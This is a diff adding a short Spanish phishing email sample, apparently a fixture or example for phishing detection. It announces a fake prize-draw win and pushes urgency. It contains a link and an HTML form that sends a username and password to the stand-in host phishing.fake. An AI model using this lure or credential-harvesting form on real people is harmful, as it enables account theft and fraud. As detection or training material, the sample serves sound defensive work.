@@ -1,0 +1,16 @@
+Subject: ¡Ganaste nuestro sorteo mensual!
+
+Felicidades, has sido seleccionado en nuestro sorteo mensual.
+
+Para reclamar tu premio, haz clic en el siguiente enlace:
+
+http://phishing.fake/sorteo
+
+<FORM action="http://phishing.fake/submit">
+<input type="text" name="usuario">
+<input type="password" name="clave">
+</FORM>
+
+¡Apresúrate, la oferta caduca hoy mismo!
+
+From: promociones@fake-domain.com  
